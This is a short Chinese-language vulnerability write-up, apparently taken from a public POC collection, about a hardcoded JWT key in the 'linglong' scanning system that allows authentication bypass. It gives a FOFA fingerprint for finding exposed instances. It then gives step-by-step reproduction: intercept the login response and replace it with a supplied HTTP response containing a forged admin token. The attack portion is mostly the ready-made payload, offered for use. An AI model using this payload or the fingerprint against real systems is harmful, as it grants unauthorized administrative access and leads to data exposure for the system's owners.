# linglong扫描系统存在JWT密钥硬编码登录绕过漏洞

# 一、漏洞简介
linglong扫描系统 存在密钥硬编码漏洞，未经身份验证验证得攻击者可构造JWT密钥绕着身份认证直接登录系统后台，造成信息泄露，使系统处于极不安全的状态。

# 二、影响版本
+ linglong扫描系统

# 三、资产测绘
+ fofa`icon_hash="684115083"`
+ 特征

# 四、漏洞复现
1、登陆时抓包


2、拦截返回包


3、替换返回包为如下内容：


```plain
HTTP/1.1 200 OK
Access-Control-Allow-Credentials: true
Access-Control-Allow-Headers: Content-Type,AccessToken,X-CSRF-Token, Authorization,Token,X-TOKEN
Access-Control-Allow-Methods: POST, GET,PUT, DELETE, OPTIONS
Access-Control-Allow-Origin: *
Access-Control-Expose-Headers: Content-Length, Access-Control-Allow-Origin, Access-Control-Allow-Headers, Content-Type
Content-Type: application/json; charset=utf-8
Date: Fri, 17 May 2024 09:39:26 GMT
Content-Length: 43
Connection: close

{"code":200,"data":{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiIxIiwiZXhwIjoxOTk5OTk5OTk5LCJpc3MiOiJsaW5nbG9uZyJ9.xAJf-cktK9WD5vXpfwTaIs6fSqVGZfG5BGnqDZwruMY"},"msg":"请求失败"}
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/pb37q4h4d15zfwg1>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
